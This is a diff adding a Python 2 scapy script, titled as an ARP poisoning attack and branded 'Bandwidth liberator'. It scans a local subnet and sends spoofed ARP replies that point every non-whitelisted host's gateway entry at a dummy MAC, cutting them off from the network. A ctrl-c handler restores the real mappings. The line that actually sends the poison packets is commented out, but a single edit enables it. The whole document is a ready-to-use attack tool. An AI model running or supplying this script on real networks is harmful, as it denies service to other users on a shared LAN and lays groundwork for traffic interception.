@@ -1,0 +1,165 @@
+# ARP poisining attack
+
+
+"""Implement an ARP poison attack
+"""
+#
+# import the necessary libraries
+#
+import time
+import signal
+import sys
+from scapy.all import *
+
+#
+# set up a handler to
+# capture ctrl-c
+#
+def signal_handler(signal, frame):
+    global isexiting
+    print ""
+    print "Intercepted ctrl-c, preparing to stitch host arps back together..."
+    print ""
+    isexiting = 1
+
+signal.signal(signal.SIGINT, signal_handler)
+
+#
+# define some globals
+#
+isexiting = 0        # flag to indicate when to clean up
+sleeptime = 60       # time to sleep between loops
+whitelist = []       # compact list of addresses whitelisted
+mywhitelist = []     # expanded list of individual addresses whitelisted
+
+print ""
+print "Bandwidth liberator!"
+
+#
+# display usage if needed
+#
+if len(sys.argv) != 4:
+    print ""
+    print "Usage: " + sys.argv[0] + " <gw> <network> <whitelist>"
+    print "    <gw> is the default gateway"
+    print "    <network> is the subnet you are attached to"
+    print "    <whitelist> is a list of addresses to not poison"
+    print ""
+    print "    example: " + sys.argv[0] + " 192.168.1.1 192.168.1.0/24 192.168.1.10-12,192.168.1.21"
+    print ""
+    print ""
+    sys.exit(1)
+
+print ""
+print "setting default gateway to: " + sys.argv[1]
+print "setting network to        : " + sys.argv[2]
+print "whitelisting the following: " + sys.argv[3]
+
+workingwhitelist = sys.argv[3]
+
+#
+# iterate over what was supplied
+# and build a list
+#
+while str.find(workingwhitelist,",") > 0:
+    index = str.find(workingwhitelist,",")
+    listitem = workingwhitelist[:index]
+    #print "pulled list item " + listitem + " from " + workingwhitelist
+    whitelist.append(listitem)
+    workingwhitelist = workingwhitelist[index + 1:]
+whitelist.append(workingwhitelist)
+
+#
+# expand the list out
+# to invidual addresses
+#
+expandedhost = IP(dst = whitelist)
+for host in expandedhost:
+    print "             expanded list: " + host.dst
+    mywhitelist.append(host.dst)
+
+print ""
+
+mygateway = sys.argv[1]             # the default gateway for the network
+mynetwork = sys.argv[2]             # the network to be poisoned
+fakegwmac = "00:13:21:de:ad:aa"     # dummy mac sent in gratuitous arp
+
+print ""
+
+while True:
+
+    #
+    # send arp requests to the network
+    #
+    ans,unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff") / ARP(pdst = mynetwork), timeout = 3)
+    count = 0    # variable to track which response we are parsing
+
+    #
+    # pull the mac and ip from each
+    # response so that we can compare it
+    # to the whitelist and poison thost
+    # that aren't on it
+    #
+    for line in ans:
+
+        skipflag = 0
+        targetmac = ans[count][1].hwsrc
+        targetip = ans[count][1].psrc
+
+        #
+        # skip the default gateway
+        #
+        if targetip == mygateway:
+            print "skipping gw " + str(mygateway)
+            mygwmac = targetmac
+            skipflag = 1
+
+        #
+        # skip any host that is whitelisted
+        #
+        for whitehost in mywhitelist:
+            #print "comparing " + whitehost + " to " + targetip
+            if targetip == whitehost:
+                print "skipping whitehost " + whitehost
+                skipflag = 1
+
+        #
+        # anything not marked to be skipped
+        # is poisoned
+        #
+        if skipflag == 0:
+            #
+            # if ctrl-c was pressed,
+            # clean up the hosts so they
+            # function again
+            #
+            if isexiting:
+                print "    stitching " + targetmac + " " + targetip + " to use mac " + mygwmac + " for gw"
+                stitcharp = ARP(hwsrc = mygwmac, psrc = mygateway, pdst = targetip, op = 1)
+                stitchframe = Ether(dst = targetmac)
+                sendp(stitchframe / stitcharp)
+            #
+            # ctrl-c was not pressed,
+            # so poison the hosts
+            #
+            else:
+                print "    poisoning " + targetmac + " " + targetip + " to use mac " + fakegwmac + " for gw"
+                poisonarp = ARP(hwsrc = fakegwmac, psrc = mygateway, pdst = targetip, op = 1)
+                poisonframe = Ether(dst = targetmac)
+                #sendp(poisonframe / poisonarp)
+
+        count += 1
+
+    #
+    # we have finished cleaning up,
+    # now it is time to exit
+    #
+    if isexiting:
+        sys.exit(0)
+    #
+    # we have not received a ctrl-c
+    # so sleep and then poison everything again
+    #
+    else:
+        print "sleeping for " + str(sleeptime) + " seconds."
+        time.sleep(sleeptime)
